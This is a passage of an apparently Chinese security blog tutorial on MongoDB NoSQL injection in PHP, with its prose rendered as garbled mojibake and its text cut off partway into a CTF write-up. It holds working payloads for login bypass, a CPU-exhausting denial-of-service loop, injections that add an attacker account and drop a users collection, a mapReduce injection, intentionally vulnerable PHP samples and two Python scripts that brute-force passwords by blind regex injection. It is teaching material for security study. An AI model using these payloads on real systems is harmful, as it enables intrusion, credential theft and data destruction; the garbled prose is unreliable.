<p>å¯¹äºPHPæœ¬èº«çš„ç‰¹æ€§è€Œè¨€ï¼Œç”±äºå…¶æ¾æ•£çš„æ•°ç»„ç‰¹æ€§ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬è¾“å…¥<code>value=1</code>é‚£ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¾“å…¥äº†ä¸€ä¸ªvalueçš„å€¼ä¸º1çš„æ•°æ®ã€‚å¦‚æœè¾“å…¥<code>value[$ne]=1</code>ä¹Ÿå°±æ„å‘³ç€<code>value=array($ne=&gt;1)</code>,åœ¨MongoDBä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>username[$gt]=&amp;password[$gt]=</code>ä½œä¸ºpayloadè¿›è¡Œæ”»å‡»ã€‚</p>
<p>è¿™ç§æ–¹å¼ä¹Ÿæ˜¯æˆ‘ä»¬é€šå¸¸ç”¨æ¥éªŒè¯ç½‘ç«™æ˜¯å¦å­˜åœ¨NoSQLæ³¨å…¥çš„ç¬¬ä¸€æ­¥ã€‚</p>
<h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥">è”åˆæŸ¥è¯¢æ³¨å…¥</h3>
<p>æˆ‘ä»¬éƒ½çŸ¥é“åœ¨SQLæ—¶ä»£æ‹¼æ¥å­—ç¬¦ä¸²å®¹æ˜“é€ æˆSQLæ³¨å…¥ï¼ŒNoSQLä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ï¼Œä½†æ˜¯ç°åœ¨æ— è®ºæ˜¯PHPçš„MongoDB driverè¿˜æ˜¯node.jsçš„mongooseéƒ½å¿…é¡»è¦æ±‚æŸ¥è¯¢æ¡ä»¶å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…queryå¯¹è±¡äº†ï¼Œå› æ­¤ç®€å•çœ‹ä¸€ä¸‹å°±å¥½ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> query =<span class="string">&quot;&#123; username: &#x27;&quot;</span> + $username + <span class="string">&quot;&#x27;, password: &#x27;&quot;</span> + $password + <span class="string">&quot;&#x27; &#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>Payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password&#x3D;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡Œäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;successful MongoDB injection&#39;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ‰‹æ³•å’ŒSQLæ³¨å…¥æ¯”è¾ƒç›¸ä¼¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from logins where username &#x3D; &#39;admin&#39; and (password true&lt;&gt; or (&#39;a&#39;&#x3D;&#39;a&#39; and password &#x3D; &#39;&#39;))</span><br></pre></td></tr></table></figure>
<h3 id="JavaScriptæ³¨å…¥">JavaScriptæ³¨å…¥</h3>
<h4 id="whereæ“ä½œç¬¦">$whereæ“ä½œç¬¦</h4>
<p>åœ¨MongoDBä¸­ $whereæ“ä½œç¬¦æ˜¯å¯ä»¥æ‰§è¡ŒJavaScriptè¯­å¥çš„ï¼Œåœ¨MongoDB 2.4ä¹‹å‰ï¼Œé€šè¿‡$whereæ“ä½œç¬¦ä½¿ç”¨<code>map-reduce</code>ã€<code>group</code>å‘½ä»¤å¯ä»¥è®¿é—®åˆ°mongo shellä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$function = <span class="string">&quot;function() &#123;if(this.uname == &#x27;<span class="subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;$where&#x27;</span> =&gt; $function</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">&#x27;test.users&#x27;</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>MongoDB 2.4ç‰ˆæœ¬ä¹‹å‰ï¼Œå¯ä»¥è®¿é—®åˆ°dbå±æ€§ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;&#39;||1) return &#123;&#39;username&#39;: tojson(db.getCollectionNames()), &#39;password&#39;: &#39;hacked&#39;&#125;&#125;&#x2F;&#x2F;&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤å¯ä»¥æ‰©å±•å‡ºå…¶ä»–çš„å¾ˆå¤šç±»ä¼¼çš„payloadã€‚</p>
<p>MongoDB 2.4ç‰ˆæœ¬ä¹‹åï¼Œæ— æ³•è®¿é—®å…¨å±€å±æ€§ï¼ŒNoSQLä¸­çš„ä¸‡èƒ½å¯†ç payload(å•å¼•å·é—­åˆ)ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;admin&#39; || &#39;&#39; &#x3D; &#39;</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$function &#x3D; &quot;function() &#123;if(this.uname &#x3D;&#x3D; &#39;anything&#39; &amp;&amp; this.pwd &#x3D;&#x3D; &#39;admin&#39; || &#39;&#39; &#x3D;&#x3D; &#39;&#39;) return &#123;&#39;username&#39;: this.uname, &#39;password&#39;: this.pwd&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
<p>æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼äºDOSæ”»å‡»çš„payloadï¼Œå¯ä»¥è®©æœåŠ¡å™¨CPUé£™å‡åˆ°100%æŒç»­5ç§’ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;1;(function()&#123;var date &#x3D; new Date(); do&#123;curDate &#x3D; new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();</span><br></pre></td></tr></table></figure>
<h4 id="eval">eval</h4>
<p>æ³¨æ„ï¼Œ<code>eval</code>ä½¿ç”¨æ–¹å¼åœ¨Mongo3.0ä¹‹åå·²ç»è¢«åºŸå¼ƒäº†ï¼Œè€Œä¸”åœ¨å®˜æ–¹é¡µé¢ä¸­ä¹Ÿæ²¡æœ‰Mongo3.0ç‰ˆæœ¬ä¹‹å‰çš„ä¸‹è½½é“¾æ¥äº†ï¼Œä»¥ä¸‹çš„å®ä¾‹ä»£ç æœªç»æµ‹è¯•ï¼Œä»…æä¾›ç»™å¤§å®¶ä¸€ä¸ªæ€è·¯ï¼Œä»¥ä¸‹ä»£ç å¼•ç”¨è‡ªhttps://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line"></span><br><span class="line">$uname = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$cmd = <span class="keyword">new</span> MongoDB\Driver\Command([</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;uname&#x27;, &#123;uname: &#x27;&quot;</span>.$uname<span class="string">&#x27;&#125;)&quot;</span></span><br><span class="line"><span class="string">]);</span></span><br><span class="line"><span class="string">echo &quot;db.users.distinct(&#x27;</span>uname<span class="string">&#x27;, &#123;uname: &#x27;</span><span class="string">&quot;.<span class="subst">$uname</span>&#x27;&#125;)&quot;</span>;</span><br><span class="line">$result = $manager-&gt;executeCommand(<span class="string">&#x27;sec_test&#x27;</span>, $cmd)-&gt;toArray();</span><br><span class="line">$result =((<span class="keyword">array</span>)$result[<span class="number">0</span>])[<span class="string">&#x27;retval&#x27;</span>];</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user=(<span class="keyword">array</span>)$user;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username: &#x27;</span>.$user[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password: &#x27;</span>.$user[<span class="string">&#x27;pwd&#x27;</span>].<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Not Found&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾€usersé›†åˆæ’å…¥æ”»å‡»è€…ç”¨æˆ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
<p>åˆ æ‰usersé›†åˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2</span><br></pre></td></tr></table></figure>
<h4 id="mapReduce">mapReduce</h4>
<p>MongoDBä¸­çš„<code>mapReduce</code>å‡½æ•°æœ‰ç‚¹ç±»ä¼¼äºMySQLä¸­çš„<code>group by</code>æ“ä½œï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå®˜æ–¹æ–‡æ¡£çš„ä¾‹å­ï¼Œåœ¨é›†åˆ orders ä¸­æŸ¥æ‰¾ status:â€œAâ€ çš„æ•°æ®ï¼Œå¹¶æ ¹æ® cust_id æ¥åˆ†ç»„ï¼Œå¹¶è®¡ç®— amount çš„æ€»å’Œï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316201954.png" alt=""></p>
<p>ç®€å•çš„è§£é‡Šä¸€ä¸‹ï¼š</p>
<p><code>map</code>å‡½æ•°ç”¨äºåˆ†ç»„ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span>&#123; emit(param1, param2); &#125;</span><br></pre></td></tr></table></figure>
<p>param1ï¼šéœ€è¦åˆ†ç»„çš„å­—æ®µï¼Œthis.å­—æ®µåï¼›</p>
<p>param2ï¼šéœ€è¦è¿›è¡Œç»Ÿè®¡çš„å­—æ®µï¼Œthis.å­—æ®µåã€‚</p>
<p><code>reduce</code>å‡½æ•°ç”¨äºå¤„ç†éœ€è¦ç»Ÿè®¡çš„å­—æ®µï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reduce</span>(<span class="params">key, values</span>)</span>&#123; <span class="comment">// ç»Ÿè®¡å­—æ®µå¤„ç† &#125;</span></span><br></pre></td></tr></table></figure>
<p>keyï¼š æŒ‡åˆ†ç»„å­—æ®µï¼ˆemitçš„param1ï¼‰å¯¹åº”çš„å€¼ï¼›</p>
<p>valuesï¼šæŒ‡éœ€è¦ç»Ÿè®¡çš„å­—æ®µï¼ˆemitçš„param2ï¼‰å€¼ç»„æˆçš„æ•°ç»„ã€‚</p>
<p>Mapå‡½æ•°å’ŒReduceå‡½æ•°å¯ä»¥ä½¿ç”¨ JavaScript æ¥å®ç°ï¼Œä½¿å¾—MapReduceçš„ä½¿ç”¨éå¸¸çµæ´»å’Œå¼ºå¤§ã€‚ä½†æ˜¯åŒæ ·ä¹Ÿå¸¦æ¥äº†éšæ‚£ï¼Œå‡è®¾æœ‰è¿™æ ·çš„ä¸€ä¸ªä¸šåŠ¡åœºæ™¯ï¼Œæ•°æ®åº“ä¸­å­˜å‚¨äº†ä¸€ä¸ª<code>store</code>é›†åˆï¼Œæœ‰ä¸€ç³»åˆ—å•†å“çš„åç§°ã€ä»·æ ¼å’Œæ•°é‡ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°ç›¸åŒå•†å“çš„ä»·æ ¼æˆ–è€…æ•°é‡çš„æ€»å’Œï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> <span class="string">&quot;/vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$param = $_POST[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line">$collection = (<span class="keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;</span><br><span class="line">$map = <span class="string">&quot;function() &#123;</span></span><br><span class="line"><span class="string">		    for (var i = 0; i &lt; this.items.length; i++) &#123;</span></span><br><span class="line"><span class="string">		 	emit(this.name, this.items[i].<span class="subst">$param</span>);    &#125; </span></span><br><span class="line"><span class="string">		    &#125;&quot;</span>;</span><br><span class="line">$reduce = <span class="string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;</span><br><span class="line">$opt = <span class="string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$results = $collection-&gt;mapReduce($map, $reduce, $out);</span><br></pre></td></tr></table></figure>
<p>è¯¥ä»£ç åº”è¯¥åœ¨<code>$param</code>ç»™å®šçš„å­—æ®µä¸Šæ±‚å’Œï¼Œä½†æ˜¯è¿™åŒæ ·ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œå¦‚æœ<code>$param</code>æ˜¯è¿™æ ·ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a);&#125;&#125;,function(kv) &#123; return 1; &#125;, &#123; out: â€˜xâ€™ &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆåœ¨MongoDBä¸­å°±ç›¸å½“äºæ‰§è¡Œäº†ä¸‹é¢è¿™æ¡è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.stores.mapReduce(function() &#123; </span><br><span class="line">for (var i&#x3D;0; i &lt; this.items.length; i++) &#123;</span><br><span class="line">emit(this.name, this.items[i].a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">function(kv) &#123; return 1; &#125;, &#123; out: &#39;x&#39; &#125;);</span><br><span class="line">db.injection.insert(&#123;success:1&#125;); return 1;</span><br><span class="line">db.stores.mapReduce(function() &#123; &#123; emit(1,1); &#125; &#125;,</span><br><span class="line">function(name, sum) &#123;</span><br><span class="line">return Array.sum(sum); &#125;, &#123; out: &#39;totals&#39; &#125;);&quot;</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äºç›´æ¥æ§åˆ¶äº†æ•´ä¸ªMongoDBçš„æ“ä½œã€‚</p>
<p>ä½†æˆ‘ä»¬ä¹ŸåŒæ—¶å‘ç°ï¼Œæ„å»ºè¿™æ ·çš„payloadæ˜¯æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œéœ€è¦æˆ‘ä»¬å¯¹MongoDBï¼ŒJavaScriptå’Œä¸šåŠ¡éƒ½æœ‰è¶³å¤Ÿçš„äº†è§£ï¼Œè¿™ä¹Ÿæ˜¯NoSQLæ³¨å…¥çš„å±€é™æ€§ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¾‹å­ä¹Ÿå‘Šè¯‰æˆ‘ä»¬æœ‰ç”¨æˆ·è¾“å…¥çš„åœ°æ–¹å°±æœ‰å±é™©å­˜åœ¨ï¼Œæ¯”å¦‚åé¢æœ‰ä¸€ä¸ªCTFé¢˜ï¼Œç”¨çš„ä¹Ÿæ˜¯MongoDBä¸­çš„èšåˆå‡½æ•°<code>aggregate</code>ï¼Œä½†æ˜¯å› ä¸ºä¸€ä¸ªGETå‚æ•°è€Œå­˜åœ¨æ³¨å…¥æ¼æ´ã€‚</p>
<h3 id="ç›²æ³¨">ç›²æ³¨</h3>
<p>å›æƒ³ä¸€æƒ³ä¸Šé¢çš„ä¾‹å­ï¼Œå‡å¦‚é¡µé¢åªæ˜¯å‘Šè¯‰ä½ æˆåŠŸæˆ–è€…å¤±è´¥ï¼Œé‚£ä¹ˆå°±æ˜¯æˆ‘ä»¬åœ¨ MySQL é‡Œé‡åˆ°çš„å¸ƒå°”ç›²æ³¨äº†ã€‚å¸ƒå°”ç›²æ³¨é‡ç‚¹åœ¨äºæ€ä¹ˆé€ä¸ªæå–å­—ç¬¦ï¼ŒMySQL é‡Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨<code>substr</code>ï¼Œè€Œåœ¨ MongoDB é‡Œæˆ‘ä»¬æœ‰ <code>$regex</code>ã€‚</p>
<p>å·²çŸ¥æŸä¸€ä¸ªç”¨æˆ·åçš„å‰æä¸‹åˆ¤æ–­çš„å¯†ç é•¿åº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;.&#123;5&#125;</span><br></pre></td></tr></table></figure>
<p>é€ä½æå–å­—ç¬¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># urlæ ¼å¼</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.&#123;4&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.&#123;3&#125;</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca0.&#123;2&#125;</span><br><span class="line"></span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;c.*</span><br><span class="line">?username[$eq]&#x3D;ca01h&amp;password[$regex]&#x3D;ca.*</span><br><span class="line"></span><br><span class="line"># jsonæ ¼å¼</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;</span><br><span class="line">&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œæåˆ°ç›²æ³¨è‚¯å®šå°‘ä¸äº†è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;?username=%s&amp;password[$regex]=^%s&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.get(target + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
<p>çˆ†ç ´å¯†ç ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200316231231.png" alt=""></p>
<p>ç±»ä¼¼çš„è¿˜æœ‰POSTçš„ç‰ˆæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1/mongo/test.php&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;|&#x27;</span>]:</span><br><span class="line">            payload = <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;%s&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; &#125;&#125;&#x27;</span> % (username, password + c)</span><br><span class="line">            r = requests.post(target, data = payload, headers = headers, verify = <span class="literal">False</span>, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> r.status_code == <span class="number">302</span>:</span><br><span class="line">                print(<span class="string">&quot;Found one more char : %s&quot;</span> % (password+c))</span><br><span class="line">                password += c</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶è¿™é‡Œçš„è„šæœ¬è¿˜æ˜¯æœ‰ä¸€äº›æ”¹è¿›çš„åœ°æ–¹ï¼Œæ¯”å¦‚å¯ä»¥é¦–å…ˆåˆ¤æ–­ç”¨æˆ·åæˆ–å¯†ç é•¿åº¦ï¼Œè€Œä¸”ä¸Šé¢ä»£ç å»æ‰äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ç­‰ç­‰çš„ã€‚è¿™é‡Œå°±ä¸å†å¤šåšæ¼”ç¤ºäº†ï¼Œåˆšå¥½ä¸‹é¢æœ‰ä¸€ä¸ªå®ä¾‹é¶æœºæ˜¯éœ€è¦å†™Pythonè„šæœ¬ç›²æ³¨MongoDBï¼Œé‚£ä¸ªä»£ç è€ƒè™‘çš„é—®é¢˜æ›´å¤šï¼Œå¯ä»¥ç¨å¾®çœ‹ä¸€ä¸‹ã€‚</p>
<h2 id="0x04-Node-JS-MongoDBæ³¨å…¥">0x04 Node.JS MongoDBæ³¨å…¥</h2>
<p>æŠ€å·§è·ŸPHP MongoDBæ˜¯ç±»ä¼¼çš„ï¼Œè¿™é‡Œå°±æä¾›ä¸€äº›Node.JSçš„é¶åœºç»™å¤§å®¶ç»ƒç»ƒæ‰‹ï¼š</p>
<p><a href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p>
<p><a href="https://github.com/ricardojoserf/NoSQL-injection-example">https://github.com/ricardojoserf/NoSQL-injection-example</a></p>
<h2 id="0x05-MongoDB-æ³¨å…¥å®ä¾‹">0x05 MongoDB æ³¨å…¥å®ä¾‹</h2>
<h3 id="CTF-NopeSQL">CTF NopeSQL</h3>
<p>é¶æœºåœ°å€ï¼š<a href="https://cybrics.net/tasks/nopesql">https://cybrics.net/tasks/nopesql</a></p>
<p>æ‰«æç½‘ç«™å‘ç°æœ‰Gitæºç æ³„éœ²ï¼Œç”¨GitHackå·¥å…·è·å¾—<code>index.php</code>æºç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once __DIR__ . &quot;&#x2F;vendor&#x2F;autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">function auth($username, $password) &#123;</span><br><span class="line">    $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query &#x3D; &#39;&#123;&quot;username&quot;: &quot;&#39;.$username.&#39;&quot;, &quot;password&quot;: &quot;&#39;.$password.&#39;&quot;&#125;&#39;;</span><br><span class="line">    $document &#x3D; $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    if (isset($document) &amp;&amp; isset($document-&gt;password)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user &#x3D; false;</span><br><span class="line">if (isset($_COOKIE[&#39;username&#39;]) &amp;&amp; isset($_COOKIE[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_COOKIE[&#39;username&#39;], $_COOKIE[&#39;password&#39;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">    $user &#x3D; auth($_POST[&#39;username&#39;], $_POST[&#39;password&#39;]);</span><br><span class="line">    if ($user) &#123;</span><br><span class="line">        setcookie(&#39;username&#39;, $_POST[&#39;username&#39;]);</span><br><span class="line">        setcookie(&#39;password&#39;, $_POST[&#39;password&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php if ($user &#x3D;&#x3D; true): ?&gt;</span><br><span class="line"></span><br><span class="line">    Welcome!</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        Group most common news by</span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$category&quot;&gt;category&lt;&#x2F;a&gt; | </span><br><span class="line">        &lt;a href&#x3D;&quot;?filter&#x3D;$public&quot;&gt;publicity&lt;&#x2F;a&gt;&lt;br&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line">        $filter &#x3D; $_GET[&#39;filter&#39;];</span><br><span class="line"></span><br><span class="line">        $collection &#x3D; (new MongoDB\Client(&#39;mongodb:&#x2F;&#x2F;localhost:27017&#x2F;&#39;))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">        $pipeline &#x3D; [</span><br><span class="line">            [&#39;$group&#39; 